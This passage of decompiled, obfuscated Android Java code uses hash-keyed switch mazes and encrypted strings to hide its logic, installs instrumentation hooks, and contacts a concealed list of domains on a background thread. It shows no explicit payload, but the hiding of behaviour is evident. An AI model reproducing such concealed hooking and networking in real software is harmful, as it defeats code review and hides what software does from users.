                                                                                                break;
                                                                                            case 967553842:
                                                                                                str41 = "ۙۧۜۖۙۨۢ۟۟ۗ۠ۘۘ۬ۧۧۧۨ۬۟ۖۘۤۦۖۘۢ۫ۥۘۡۡ۬";
                                                                                                continue;
                                                                                        }
                                                                                    }
                                                                                    break;
                                                                                case -487435471:
                                                                                    break;
                                                                                case 3358456:
                                                                                    str41 = "ۢۢۦۖ۫ۖۢۥۡۘۦۛ۠ۧۤۚۖۨۚۜۘۘ۫۠ۜۖۨۡۗۥۘۘ۟ۙۨۘۚ۠۟";
                                                                                case 636400792:
                                                                                    HookManager.hookInstrumentation(context);
                                                                                    break;
                                                                            }
                                                                        }
                                                                        break;
                                                                    case -1345065216:
                                                                        break;
                                                                    case 734581790:
                                                                        str39 = "۟ۘۡۢۜۙۚۗ۬ۡۘۧۡۜ۟ۦۚۘۘۚ۠ۘۘۜۤۨۘۛۥۘۛۚۡۘ۟ۗۥۨۤ";
                                                                }
                                                            }
                                                            HookManager.initHooks(context);
                                                            break;
                                                        case 1206224661:
                                                            String str43 = "ۥ۠ۜۘ۫ۢ۫ۗۥۢۗۗۘۘۛۙۥۨۖۚۤ۠ۜۥۥۤۤۢۘۘۦۖۧۤۤۛ۠ۢۦۗۜۡۛۘۖۦۡۘ۬ۢۦۙۖۥۘۗۦ";
                                                            while (true) {
                                                                switch (str43.hashCode() ^ 211597186) {
                                                                    case -951919478:
                                                                        str43 = "ۧۢ۠ۦ۫ۛ۠ۡۘۗ۟ۖۘۛۧۧۧۜۥ۬ۢۜۧۖۖۜۜۘۛۚۤۦۜۜۘۡۨۡۨۖۖۘۤۘۨۦۘ۫ۥۖۘ";
                                                                        break;
                                                                    case -879726279:
                                                                        str38 = "ۨۨۥۘ۠۫ۦۚۤۦ۠ۘۚۥۚۛۡۖۦۘۤ۬ۡۜۡۥۘۥۜۥۘۥۥۜۢۚۥۘۖۖ۫ۚۨۦۚ۠۠ۖۘۨۗۗ";
                                                                        continue;
                                                                        continue;
                                                                    case -352722573:
                                                                        if (!jSONObject.optBoolean(l2.decrypt("ju9jyC5iTOGE6g==\n", "64ECqkIHBI4=\n"), true)) {
                                                                            str43 = "ۦۡۖ۫۟۫ۛ۬ۢۚۜۜۢۜۦۘۙۤۚۚ۬۟ۢ۬ۦۘۛۘ۫ۧۜۗ۬ۗۨۘۛ۠ۥۡ۟ۡۦۤۖ۠ۥۖۤۧۖۘ";
                                                                            break;
                                                                        } else {
                                                                            str43 = "ۛۚۜ۠ۧۖۘۨۛۖۨ۫۫ۚۧۜۡۛۦۤۥۧۧۖۘۢۦۤۚۚۗۦۡۡۨۧۖۙۗۘ۬ۢۡۘۖۥۡۘۗۗۢ";
                                                                            break;
                                                                        }
                                                                    case 915312095:
                                                                        str38 = "ۨۦۨۘۤۦۤۗۜۜۤ۬۠ۗۨۚۙۧۨۥ۟ۦ۫ۚۘۘۧ۫ۨۘۢۛۦۖ۠ۨ۫۬ۡۨۖۜۨۥۘۙ۠ۘۛۖۛ";
                                                                        continue;
                                                                }
                                                            }
                                                            break;
                                                        default:
                                                            continue;
                                                    }
                                                }
                                                new Handler(Looper.getMainLooper()).post(new a(4));
                                                return;
                                        }
                                    }
                                    break;
                            }
                        }
                        break;
                    case 1005398036:
                        String str44 = "ۥۚ۬ۘۜۗۖۦۦ۬۬ۥۡۘۜۘۛۚۦۘۚۢۢۛۦۧۢۥۧۢۙۙۙۜۥۜۢۘۛۤۨۘ۟ۘ۠۠ۧۧ۠ۙ۠ۘۜ۫ۧۧ۫";
                        while (true) {
                            switch (str44.hashCode() ^ 912624826) {
                                case -1769324736:
                                    str = "ۜۤۨۘۗۦ۫ۙۘۛۘ۟ۡۤۖۧ۬ۛۤۦ۫ۛ۫۬۟ۙۧۥ۟۫ۨۘ";
                                    continue;
                                case -910431488:
                                    if (strShellSP_read == null) {
                                        str44 = "ۗۖۤ۠ۥۛۙۢۦۧۙۧۢۧۗ۫ۚۙۢۡۜۘۧ۬ۙ۫ۖۚۘۖ۟ۛۜۘۡ۠ۘۙ۠ۜۘۡۛۖۘۘۦۙۛۤۨۘۙۢۨۦ۫ۥ";
                                        break;
                                    } else {
                                        str44 = "ۨۙۤۧۗۥۘۦۗ۠۟ۡۥۖۥۨۙۚۜۘۘۖۗۤۢۨۘۡۥۖۥۗۘۢۡۙۜ۠ۤ۬ۛۢۢۨۦ";
                                        break;
                                    }
                                case 985949099:
                                    str = "ۤۡۜۜۙۢۡۚۨۘۚۥۜۧۨۘۖۜۢ۠ۨۘۘۛۘۨۘۜۦۙ۠ۖۛۗ۟ۨۘۛۗۡۘ۠۬ۧۘۡ";
                                    continue;
                                case 1373110936:
                                    str44 = "ۘ۠۬ۘ۠ۖۘۡ۟۫ۥۥۚ۬۫ۥۨ۟۬ۤۨۘۧۨ۬ۧۛ۠۬۟ۥۘ";
                                    break;
                            }
                        }
                        break;
                    case 1463609352:
                        break;
                    case 2146492742:
                        str = "ۘۢۗۙۚۥۘۛۙۜۡۚۜ۫ۜۥۘۗۘ۠ۙۜ۟ۘ۬ۜۥۚ۫ۦ۫ۥۘ۠۠ۥ۬ۡۡۘۢۧۙ۟ۚۙۙۖۗۚۢۢ۠ۤۦۚۘۖ";
                }
            }
            k2.logToFloatingWindow(l2.decrypt("qbVUQhNMkeMUxUg2SnLsE2p+Dk1aB6UfFuplOUZi7ipatVRCE0yRW3jyAGxL\n", "8lLo0fbhCb4=\n"), l2.decrypt("rgk=\n", "wWKpBW2PaRM=\n"));
        } catch (Exception e4) {
            k2.logToFloatingWindow(h.d("9zvHpko/u1lIYcTSOzrEuD851q1GF67jEXKevw96nrlJeMrdGzfMuDY=\n", "rNx7Na+SIwQ=\n", new StringBuilder(), e4), l2.decrypt("CshCNNg=\n", "b7owW6rib5g=\n"));
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:4:0x0030. Please report as an issue. */
    public static void startRequest(final Context context, boolean z) {
        int i = 0;
        final SharedPreferences sharedPreferences = null;
        boolean zEquals = false;
        String[] strArrSplit = null;
        final String[] strArr = null;
        final String[] strArr2 = null;
        String str = "ۥۘ۟ۤ۟ۦۘۙۢۜۘۙۘۡۜۢۧۡۛۥۘۚۗۖۜۥۥۤۙۙۤ۬ۤۨ۬ۨۘۦۧۖۘۤۛۗۜۚۖۘ۠ۢۚ۠ۢۘ";
        int i2 = 0;
        int i3 = 0;
        int i4 = 0;
        String strDecrypt = null;
        String str2 = null;
        String strDecrypt2 = null;
        String strDecrypt3 = null;
        String[] strArr3 = null;
        while (true) {
            switch ((((str.hashCode() ^ 545) ^ 379) ^ 314) ^ (-810494176)) {
                case -2045895004:
                    str = "۠ۤ۫ۛۨ۫ۢۘ۬ۘۤۖۗۙۦۙۖۖۚۢۖۘۢۚۖۘ۫ۥۧۖۜۘۘۡۜۥۘۤ۫ۚ۬۫ۨۚۜۢۧۨۙۨ۬ۧۧۘۘۦۛ۟";
                case -1680762725:
                    strArrSplit = fcRuQsQrcxOAzxwEalcM.DOMAINS.split(l2.decrypt("9w==\n", "21dyII2zMSM=\n"));
                    str = "ۛۨۡۘۢۖۘۙ۟ۡۘۛۨۨۘۥۥۧۘ۠ۥۦ۠ۗۢ۬ۙۘۜۤۚۛ۫ۢۥۚۘۜۧۗۧ۫ۗۙۨۜۘۛۦۜۧۛۘۘۡۙۘۘ۠ۙۚ";
                case -1670067134:
                    str = "ۨۤۛۢۘۤۥۘ۠۟ۗۗۥ۟ۦۢۨۜۖۡۧۘۖۤۛۦۜۙۛ۟ۘۙۥۤۥ۬ۙۗۦۛ۟۠ۗۨ۬ۘۘۢۙۢ";
                    i4 = i;
                case -1576062174:
                    String str3 = "۟ۗۥۘۚۨ۟ۖ۬ۗۙۜۡ۟ۨۚۢۡۘۛۥۨۘ۬ۚۦ۠۫ۜۘۚۘۜۤۖۨۧۥۜ۬ۗۡۚۧ۬ۨۘۤۥۜ۠ۚۢۦ۫ۡۘ";
                    while (true) {
                        switch (str3.hashCode() ^ (-1299914221)) {
                            case -2015976811:
                                break;
                            case -1389818307:
                                String str4 = "۟ۥۗۦۖۤۢۧۤۜۡۥۘۙۚۧ۬ۙۦۘۘۗۖۦ۠ۤۖۜۘ۟ۙۥ";
                                while (true) {
                                    switch (str4.hashCode() ^ 412238832) {
                                        case -1965081730:
                                            str3 = "ۗۥ۬ۗۡۘۘ۠ۨۨۢ۫ۚۥ۬۬ۥۨ۠۫ۚ۬۬ۥۛۘ۫ۘۢۗۡۜۘ۠ۘۥۚ";
                                            break;
                                        case 606480973:
                                            str4 = !a ? "ۛۜۘۘۘۙۦ۠ۨۜۧۤۥۖۦۜۤ۠ۤ۟ۚۡۚ۬۟۬ۡۘۗ۠ۢ" : "ۜ۫ۨ۠ۚۜۘۖۛۡۢۧۥ۬۫۟ۙۨۨۛۙۜۜ۫ۦۘۜۤۖۜۡۥۘۗۥۘۥۦۘۙۡۖۦ۫ۡ";
                                        case 1353369697:
                                            str4 = "ۨۗۦۘۖۢۢۤۜۘۘۤۧۤۖۘۘۘۛۨۥۜۤۖۘۥۛۧۘۘ۟ۙۧۡۙۖۘۢۗ۬";
                                        case 1953320037:
                                            str3 = "ۥۜۦۥۛۙۥۤۜ۠ۗۡۧۙ۫ۨ۟ۖ۠ۡۥۘۚۡۘۘۦۤۥۘۨۗۡۘۦۜۘۥۖۗۢ۫ۢۦ۫۬ۧۤۚۘۖۘۛ۠ۖۘۚۦ۬";
                                            break;
                                    }
                                }
                                break;
                            case -835940222:
                                str3 = "ۦ۠ۦۘ۟۬۫ۜ۫ۤۖۜۘۥۘ۫ۗ۫ۖۘۤۥۛۤۘۦ۫ۡۚۢ۬ۗۗۦۛ۟ۦ۟ۢۥۡۘۗۢۚۤۛۡ۬ۗ۬ۛۙۨۘۢۗ";
                            case -341540240:
                                str = "ۗ۫ۡۘۢۦۘۘۛۛۨۜۖۙ۠ۘۦۢۗۥۢۡۘۦۥ۠۠ۨۡۚۦۥۘۢ۟۟ۖۚۢ";
                                break;
                        }
                    }
                    break;
                case -1489385560:
                    str = "۬ۨ۬ۧۧۘۘ۫ۛۘۛۥۨۘۗۘۚۦ۠ۡۘۗۜۦۡۖۜۘۗۙۘ۫۟ۦۘۧۧۨۘۙۜۧۘۤۖۦۘ";
                    strDecrypt3 = l2.decrypt("sJDJCwpxFA==\n", "1P+kamMfZzo=\n");
                case -1167352784:
                    k2.logToFloatingWindow(l2.decrypt("uG8Cws4eQO76OyOrjig3gOZPa6LkchvJtXw1wdgX\n", "XdOCJ2mVpmc=\n"), l2.decrypt("uy0oXg==\n", "0kNOMZ1rsTU=\n"));
                    str = "۬ۥ۫ۚۛۥۘۗ۟ۙۘۡۡۘۨۜۧۘ۬۠ۡۘۖۖۚۢ۟ۥۡ۫ۧۤۧ۬۟ۙۤۤ۬ۖۘ۟ۘۜۜۙۦۚۥۘۦۨۡۚۢۗۢ۬ۡۘ";
                case -989812607:
                    str = "ۜۡ۠ۙۢۥۗ۬ۖۥۖۖۘۛۥ۟ۦۙۨۧۡۖۘۛۡۚۢۜ۟۫ۢۛۢ۫۟ۢۨۘۘۧ۟۬ۢۛۖۙ۠ۢ۬ۧۖۘ";
                    i4 = i;
                case -953404681:
                    String str5 = "ۨۥ۟ۡۤ۬ۢ۠ۧۗ۫ۖ۫ۜۖ۫ۖۘۧۗۨۘۙۧۗۦۜۤ۟ۤۦۘۧۡۘ۫ۤۙ۟ۗۗۙۤ۟ۘۢۧ۟ۦۙۨۘۖۡۛ";
                    while (true) {
                        switch (str5.hashCode() ^ (-1298055608)) {
                            case -2147334536:
                                String str6 = "۬ۛۥۤۡ۫ۗۜۤۥۢۧۜ۫ۜۥۙۘۘۖۜ۫ۨۢۨۨۦۜۘۘۘۥۘۡ۠ۜۥ۫۫";
                                while (true) {
                                    switch (str6.hashCode() ^ 793690417) {
                                        case -1088609031:
                                            str5 = "۬ۖۜۜۧۧ۫۬ۖۧ۟ۦۘۧۢۙۡۤۙۤ۫ۗۦ۫ۦۨۛۜۘۦ۫ۖۘۛۖۢ۟ۧ۟ۤۘۗۚۢۙ۠۟ۜۘۘۖۤۨۖۦۘ۬ۙۜۘ";
                                            break;
                                        case -288296115:
                                            str6 = !zEquals ? "ۡۖۢ۫ۧۜۚ۫ۛۙۨ۟ۙ۫ۢۖۨۘۚ۠ۜۨۗۥ۟ۢۦۚۧ۟ۗۖۘۧ۟ۡۜۚ۬ۨۡۧۘ" : "ۜۘ۬ۖۥۚۛۗۧۚۨۛۤۦۘۘۧ۫ۡۨ۬ۘۘۘ۟ۢ۠۬ۡۘۨۖ۬ۘۤ۬ۛ۟ۢ۟ۜ۫ۦۘۚۚۢۜۘۚۙۘۘۧۘۜ۠ۦ";
                                        case 1920132987:
                                            str6 = "ۧۡۦۘۚۜ۬ۢۧۚۡۘۙۢ۫ۘۘۛۗ۫ۛۛۙۥۦۖۢ۬ۖۤۗ";
                                        case 1987529893:
                                            str5 = "ۘ۠ۘۤۜۡۘۗۨۘ۠۟ۧۛۨۡۘ۫ۦۜۘ۫ۘ۬۫۠ۜۘ۬۬ۢۘۢۛۙ۬ۙۦۧۡ";
                                            break;
                                    }
                                }
                                break;
                            case -724537994:
                                break;
                            case 481909834:
                                str5 = "ۛۦۗۥۘۘۧۢۤۦۚۗۛۖۜۘۨۛ۬۬ۚۘۡۗۨۨۛۘۜ۟ۢ۫ۜۨۘۧۨ۟";
                            case 943821124:
                                str = "ۥۢۚۦۨۘۘۚۜۘۘۛۙۙ۠ۚۦۘۦۜ۠ۘۦۥۥۛ۟ۗ۬ۥۛۥۜۘ۠ۘۥۘۛۡۙ۬۬ۨۦۥۡۡۛۗۧۧ۠ۨ۬ۜۧۗۘ";
                                break;
                        }
                    }
                    str = "ۧۥۧۥ۬ۘۘۧۚۧۚۖۘۘ۬۬ۤ۬ۤۦۧۘۗۗۙۦ۬۠ۛ۟۟۟ۙۘۘۦۙ۟ۖۚ۫۠ۢۧۛۢۦۗۢۨۘۙۤۤ۠ۘ۬";
                    break;
                case -796661916:
                    str = "ۨۤۗۜۨۦۜۛۧ۠ۗ۬ۚ۫ۖۘ۟ۜۚ۟ۛ۠ۖۡۨۚۨۤۨۨۦۘۙۢۖۚۡۤۚۜۧۦۡۛۧ۠ۢۢۧۖۘ۬ۜۧۘۢۖ";
                case -756762324:
                    String str7 = "ۙۚۖۛ۫ۖۘۗ۠ۘۘۡۧ۟ۘۢۘۘ۫ۖۧۘۡۙۜۖۦۢۗ۫ۡۖۚۤ۬۬ۡۘۗۢۥ";
                    while (true) {
                        switch (str7.hashCode() ^ 1106302631) {
                            case -937123406:
                                break;
                            case -692350752:
                                str7 = "ۖۧۦ۟ۛۛ۬ۘ۬ۦۥۜۘۗۥۘۤ۠ۙۜ۟ۨۘۧۛ۬۫۫ۘۜۜۙۗ۬ۙۙۤۙ۫ۖۗۗۜۤۙۤۘۘۦۡۖ";
                            case 1593177460:
                                String str8 = "ۜۚۨۛۡۦۘ۬ۥۘۥۧۘۡۢۘۘۜۜۛۚۛۘۙۤۧۘۤۦۘۧۙۖۘ۠ۚۖۘۙ۫ۥۧۨ۟ۜۢۖۡۨۖۜۤ۟";
                                while (true) {
                                    switch (str8.hashCode() ^ 545242508) {
                                        case -1997380623:
                                            str8 = "ۜۢۢۢۨۛۗ۬ۗۘ۠۟ۢۦۘ۠ۦۡۘۙۢۥۨ۫۬ۦۚۢ۟ۗۧۧ۟ۖۖۜ۬ۛ۠۫ۨۥۡ";
                                        case -915773189:
                                            str7 = "ۧۧۤۖ۟ۘۖۤۘۦۙۜۡ۬ۘۚۡۢۖۡۥ۠ۦۘۙۦۚۧۡۛۖ۫ۚۨ";
                                            break;
                                        case 5595181:
                                            str7 = "ۦۙۜۘۦۙۜۘۧۗۡ۬ۘۥ۟ۤۦۘۨۗۦۘ۟ۤ۬ۚۗۦۨۙۘۘ۠ۡۖۧۥۖۤۦ۫ۚۤۦۚ۟ۜۘ۟۟ۖۛ۟ۧ";
                                            break;
                                        case 12123989:
                                            str8 = str2.equals(sharedPreferences.getString(e, strDecrypt)) ? "ۢ۫ۖ۫۟ۘۦ۟ۦۨۤۥۘۥۙۗۨۜۘ۫ۨۖۘۜۙۙۙۗۘۗۗۦۢ۫ۨۗۥۘۚۗۜۛۗ۟ۧۜۘ۠ۥ۬ۚۖۛۨۡ۟" : "۬۠۫ۖۤۧۛۖۨۙۛۦۘۥۤۡۘ۬ۗ۬ۗۦ۬۬ۙ۫۠ۛۛۜ۫ۦ۫ۨ۬ۡۧۘۢۢ۬ۡۥۥۡ۠ۗۡۦۘۘ";
                                    }
                                }
                                break;
                            case 1699574166:
                                str = "ۙۥۥۘ۟ۢۨۨۦ۬ۚۘۨۧۘۗۚۧۗۗۖ۫ۤۢۡۘۤ۠ۙۨۜۥۥۚۙۢۤۡۘۡ۫ۙ۟ۦۘ۠۟ۡۘ۠ۙۖۘ";
                                break;
                        }
                    }
                    break;
                case -455499068:
                    str = "ۚۜۜۘ۟ۙۤۥۧۜ۠ۜۦۘۥۛۛۖ۟ۦۥ۫ۤۖۙۖۘ۟ۧۥۘۧۦۜۖۦۜۘۤۘۖ۫ۜۡ۬ۗۖۘ";
                    i2 = sharedPreferences.getInt(f, 0);
                case -318179367:
                    str = "ۘ۟ۤ۬۠ۨۘۢۖۚۜۙۛۤۖۙۖ۠ۤ۬ۧۖ۬ۥۘ۫ۤ۠ۦ۬ۨۘ";
                    zEquals = fcRuQsQrcxOAzxwEalcM.DOMAINS.equals(l2.decrypt("FBzA1ULrnN8cHNk=\n", "Tz+Emg+q1ZE=\n"));
                case -289889558:
                    strArr2[1] = strDecrypt2;
                    str = "ۛ۬ۥۘۧۡۘۧۜۦۚۘۜ۫ۦۖ۫ۧۧۛۜۧ۬ۨۛۘۦۧۘۜۦۘۘۘۖۘۘۚۨۘۙۥۜۘۤ۫ۘۘ";
                case -55150717:
                    str = "۠ۤ۫ۛۨ۫ۢۘ۬ۘۤۖۗۙۦۙۖۖۚۢۖۘۢۚۖۘ۫ۥۧۖۜۘۘۡۜۥۘۤ۫ۚ۬۫ۨۚۜۢۧۨۙۨ۬ۧۧۘۘۦۛ۟";
                    strArr = strArrSplit;
                case 81618586:
                    final int[] iArr = {i4};
                    final int[] iArr2 = {i2};
                    final int[] iArr3 = {0};
                    final boolean[] zArr = {false};
                    final boolean[] zArr2 = {false};
                    final boolean z2 = !zEquals;
                    final int[] iArr4 = {0};
                    new Thread(new Runnable(iArr, strArr, iArr2, context, iArr3, sharedPreferences, strArr2, zArr, zArr2, z2, iArr4) { // from class: core.pro.android.notify.o0
                        public final int[] a;
                        public final String[] b;
                        public final int[] c;
                        public final Context d;
                        public final int[] e;
                        public final SharedPreferences f;
                        public final String[] g;
                        public final boolean[] h;
                        public final boolean[] i;
                        public final boolean j;
                        public final int[] k;

                        {
                            this.a = iArr;
                            this.b = strArr;
                            this.c = iArr2;
                            this.d = context;
                            this.e = iArr3;
                            this.f = sharedPreferences;
                            this.g = strArr2;
                            this.h = zArr;
                            this.i = zArr2;
                            this.j = z2;
                            this.k = iArr4;
                        }

                        @Override // java.lang.Runnable
                        public final void run() throws InterruptedException, PackageManager.NameNotFoundException, IOException {
                            String str9 = "ۡ۠ۙۜۥ۬ۡۚ۬ۨۨۥۘۜۦۛۧۙۖۧۚۢ۠ۖ۟ۨ۫ۥ۟ۖۜۧۥۘ۬ۘۢۦۦۨۙۤ۠۬ۦۗۢۥ۟ۘۘۨۥۗۦ";
                            int[] iArr5 = null;
                            boolean[] zArr3 = null;
                            boolean[] zArr4 = null;
                            String[] strArr4 = null;
                            SharedPreferences sharedPreferences2 = null;
                            int[] iArr6 = null;
                            int[] iArr7 = null;
                            int[] iArr8 = null;
                            while (true) {
                                switch ((((str9.hashCode() ^ 120) ^ 801) ^ 588) ^ (-1913657481)) {
                                    case -1958173437:
                                        str9 = "ۚۖۚۗۖۤ۫ۖۖ۫ۘ۫ۡۛۘۘۙۘۖۘۖۤۧ۟ۦۦۤۤۧ۫ۗۡۘۡۙۛۤ۠ۡۘۘۦۡۢ۬ۥۘۖۘۖۘۗ۬ۤ";
                                        break;
                                    case -1668241248:
                                        s0.a(iArr8, this.b, iArr7, this.d, iArr6, sharedPreferences2, strArr4, zArr4, zArr3, this.j, iArr5);
                                        str9 = "۠ۥۦۘۜۚۡۦ۫ۥۘۢۙۜۘۡۗۤۦۙۚۙ۬ۧۢۛۧۗۜۦۚ۠۟۫ۨۘۥ۫۫ۛۤۤۖۤ۠ۧۛۜ۫ۜ";
                                        break;
                                    case -1663990356:
                                        iArr7 = this.c;
                                        str9 = "ۧ۫ۖ۠ۙۨۙۥۤۧۨۥۛۧۥ۟ۖ۠ۨۜۤ۫ۥ۬ۡۧۡۘۖۙۜۘۨ۟ۛۨۘ۟ۦ۫ۙ۫ۖۙ";
                                        break;
                                    case -873910146:
                                        iArr6 = this.e;
                                        str9 = "۠ۘ۬۠ۜۦۘۨۢۥۘۛۤ۬ۙۘۙۡ۠ۥۚۤ۠ۜۚۧۡۡۤ۟ۛۖۘ۟ۧۤۜ۠ۜ۠ۜۙۨۚۦ";
                                        break;
                                    case -793735724:
                                        return;
                                    case -11077280:
                                        iArr8 = this.a;
                                        str9 = "ۙۘۛ۬ۢۜ۠ۧۘۢۜۥۤۢۧۧۢ۬ۙۤۜۗۗۥۘۡۡ۬ۦ۠ۜ";
                                        break;
                                    case 957536905:
                                        zArr4 = this.h;
                                        str9 = "ۗۗۡۘ۠ۧۛۛۜۘ۠۫ۜۘ۠۟۟ۥۚ۫ۡۜۜۘۧۙ۫ۚۗۜۢۗ۬";
                                        break;
                                    case 1193685952:
                                        sharedPreferences2 = this.f;
                                        str9 = "ۦۦۛۙۜ۫ۡۨۖۘۦۜۢۧۛۡۘۦۥۧۦۘۘۧۦۛ۟۫ۡۘۥۗۗ";
                                        break;
                                    case 1380284935:
                                        strArr4 = this.g;
                                        str9 = "ۥۧ۫ۘۖۛۗۜۗۗۡۡۧۘۘۘۘ۫ۨ۠۫۫ۡۨۢ۬۬ۢۥۧۨۘۘۧۘۦ";
                                        break;
                                    case 1705216257:
                                        zArr3 = this.i;
                                        str9 = "ۡۚۛۙۨۥۘۚۗۨۘۢ۬۫ۖ۠ۗۛۧۢۖۚۚۦۖۦۘۦۛۛ۫۫ۛۛۚ۫ۛ";
                                        break;
                                    case 2042850017:
                                        iArr5 = this.k;
                                        str9 = "۠ۗۖۖۘۖ۫۬ۛۧۨ۬ۦ۬ۘۛ۟ۛۛۧ۟ۥۦۘۢۙۥۘۘۥۜۘ";
                                        break;
                                }
                            }
                        }
                    }).start();
                    str = "ۨۤۗۜۨۦۜۛۧ۠ۗ۬ۚ۫ۖۘ۟ۜۚ۟ۛ۠ۖۡۨۚۨۤۨۨۦۘۙۢۖۚۡۤۚۜۧۦۡۛۧ۠ۢۢۧۖۘ۬ۜۧۘۢۖ";
                case 152015407:
                    str = "ۛۤۦۙۢۨۘ۬ۘ۫ۘۥ۟ۥۢۥۘۗ۠ۨۘۡۜۚۛۘۖۘۜۥۤۤۦۡۘ۟ۦۜۘۛۖۨ";
                    strDecrypt = l2.decrypt("t0qdm6piOg==\n", "0yXw+sMMSRQ=\n");
                case 264197134:
                    str = "ۛۛۢۦۜۨ۠ۨۥۘۗۖۢۤۨۥۧۘۨۘۤۘۘۥ۟ۙۛ۟ۥۦ۠۬ۡۨۘ۟۟ۗۜ۟ۨۦۧۦ";
                case 427731531:
                    strArr2[0] = strDecrypt3;
                    str = "۬ۗ۫ۗۜ۫ۖۛۨۦ۫ۚۤۜۜ۟۫ۚ۫۬ۜۨۤۡۡ۠ۘۘۨۦۦۛۤۖۘۨ۬ۖۘۧۥ۠ۚۢۖۘۤۧۡ۬ۖ";
                case 496181258:
                    str = "۫۬ۢۢ۟ۗۜۙۨۨ۫ۡ۠ۥۘۥۜۨۨۘۦۘۨۛ۬ۛۦۙۥ۟ۥۘۤۨۥۛۘۤۖۚۙۗۘ۟ۦۛۤۤۧۦۘ";
                    strDecrypt2 = l2.decrypt("nUtkdg==\n", "7SQXAkX2868=\n");
                case 504683535:
                    String str9 = "ۡۚ۠ۧ۟ۤۢۛۛ۟ۜۘۖ۠ۚۘۛۘۘۡۨۢۥۘۨۘ۬ۤۥۘۨۖۥۡۘ۠ۡۦۥۖۚۥۘۨۛۧ";
                    while (true) {
                        switch (str9.hashCode() ^ (-577718184)) {
                            case -1292667556:
                                str = "ۗۥۙ۬۫۟ۙۢۡۜۜۦۘۛۤ۠۫ۙ۬ۜۙۘۡۚۛۘۡۜۘ۫ۥۧۘۦۦۥۘ۟ۗۨۘ۠ۥۖۚ۟۬";
                                break;
                            case -271598282:
                                break;
                            case 101529511:
                                str9 = "ۡۘۢۗۘ۬ۧۨۛ۬ۗ۟ۡۤ۬ۜۘۘۥۢۛۛۜۛۗۦ۟ۙ۬ۗۙۡۢۘۙۤۥۙۜ۠ۤ۠ۥۦۥۥۦۤۦۙۜۧۛ";
                            case 833902267:
                                String str10 = "۟ۨۙۦۧۘۘ۬۟۟ۘۢۢۜ۠ۘۘ۫۫ۤۡ۫ۖۘۨۘۚۥ۠ۦۘ۟ۥۨۘۡۙ۠۠۫۟ۦۥ۠ۨۜ۫";
                                while (true) {
                                    switch (str10.hashCode() ^ (-794038831)) {
                                        case -2135652442:
                                            str9 = "ۤۡۘۘۛۜۜۧ۠ۘۘۛۛ۟۟ۨۙۜۗۧۚۢۥۘۨ۫ۙۨۢۡۙۨۘۨۛۨۨۥۘ";
                                            break;
                                        case -1356111303:
                                            str9 = "ۤۨۖۚۘۨۗۜۖۘۨۦۡۙ۫ۦۘۦ۬ۙۘۡ۠۟ۜ۬۠ۤۚۘۛۛۤۖ۠ۨۜۥۤ۟۬۠ۥ";
                                            break;
                                        case -967362798:
                                            str10 = "ۤ۟ۙۡ۠ۨ۠ۛۦۘۛۘۙۙۧ۬ۜۤۚۗۨۢۢ۬ۦۨۦۚۘۥ۟ۥۘۦۘۡ۬۠";
                                        case 1724546769:
                                            str10 = !z ? "۬ۖۡ۠ۦۢۖۛۥۘۤ۬ۜۗ۬ۥۘۙۛ۟ۡ۬ۢ۬ۜۨۚۚۜۨۨ۠" : "۬ۗۦۘۤۛۨۘۨۙۖۘۦۥۧۨۜۛۥۖۘۘۜۨۘ۟۟۫۫ۖۧ۫ۘۨۘۛ۟ۤۢۨۦۘۦ۬ۦۘ۬ۖۨۘۙۚۗۢۦ۫";
                                    }
                                }
                                break;
                        }
                    }
                    str = "ۨۥۧۢۛ۫۬ۗۥۦۘۗۘۥۘۤۢۦۛۙۤۛ۬ۚۘۤۢۗۢ۠ۙۗۜۘۤۖۥۘ۬ۛ۠ۥ۬ۦۥۛ۬۟ۨۙ";
                    break;
                case 518851516:
                    i = 1;
                    str = "ۨۨ۫ۘۙ۠۬۫ۨۢۥۗۚۨۘۘۚۦ۬ۛۤۘۛۛۥۜۢۥۖۤۨۗۚۨۗۡۘ۠ۖۜۖۗ۬ۨۛۦۘ۬ۖۥۗۢۧۖ۠";
                case 522562392:
                    sharedPreferences = context.getSharedPreferences(d, 0);
                    str = "ۗۡ۟ۡۦۙ۬ۨ۬۫ۙۙۘۙۥ۟۟۫ۘۨۡۘۤۙۡۘۛ۠۬۬۠ۗ";
                case 663586788:
                    String str11 = "ۘۢۥۢۚۧ۠ۨۜۘۧۢۗۗۖ۬ۗۜۛۗۤۜۚ۟ۙ۬ۥۡۛۛۗۛۥۛۛۘۡ";
                    while (true) {
                        switch (str11.hashCode() ^ (-1458225706)) {
                            case -2090474398:
                                String str12 = "ۨ۫ۘۘۜۡۡۛ۠ۥۗۚۛۗۗۡ۫ۛۢۗ۬ۥۘۢ۫ۡۢۚ۟ۢۨۨۘ۟ۥۨۘۙۘۧۘ";
                                while (true) {
                                    switch (str12.hashCode() ^ (-602686747)) {
                                        case -1399030520:
                                            str11 = "ۧۡۦۗ۫ۙۥۗۘۘۙ۬ۢۨۘۧۜۧۦۘ۟ۤ۬ۙۤ۟ۧۜۚۘۧۘ۫ۧۚ۬ۧۥۘۗۤ۠ۜ۬ۧۤۦۥۘۤۥۦۘۦۡۜۚۥ";
                                            break;
                                        case -384951024:
                                            str12 = b != null ? "۬ۛۨۘۗۖ۟۠ۗ۫ۖۤۙۗ۫ۚۖۢۤۖۡۤۥۚۘۘۢۡۛۡ۠ۜۘ" : "ۚۥۥۥۖ۟ۗۚۥۘۥۗۥۘۜۡۘۘۢۘۗ۟ۥۛۚ۠ۜۘۢۧۨۛۛۥۘۦۨۡۘۧ۬ۗ";
                                        case 1066314806:
                                            str12 = "۫۟۟۬ۙۤۗۥۜۘۜۥۨ۟۟ۘۘۘۛۤۛۙۙۨۘۙۛۜۦۡۘ۬ۥۡۢۙۧۧۡۧۘۥۖۘ";
                                        case 1771475419:
                                            str11 = "ۗۘۗۜۘۘۜۤۖۘۡۧۗۖ۟۫ۨۛۙۛۙۧۧۤۤ۬ۛۤ۟ۛۛۤۥۘۧۙۧ";
                                            break;
                                    }
                                }
                                break;
                            case -1420285139:
                                str = "۬۠ۖۘۙۨۘۗۗ۟ۜۗۨۘۛۨۥۘۛۨۢۥۘۦۘۤۦۥۘۤ۠ۙۤۚۛۘ۠ۗۤ۟۫ۧ۠ۘۘۘۛۘۧ۟۫۫ۢ";
                                break;
                            case -1256600963:
                                str11 = "ۜۘۤۚۜۦۘۨۦ۠ۢۦۦ۫ۨ۠ۨۡۖۤۧۦ۟ۡۖۘۙ۫۫ۚۛۘۘۜۨۖۘۚۧۜۘ۟ۢۦۘۛۡۖ۠ۙۨۘۗ۟ۗۨ۠ۦۘۤۘۦۘ";
                            case -775544989:
                                break;
                        }
                    }
                    break;
                case 833150178:
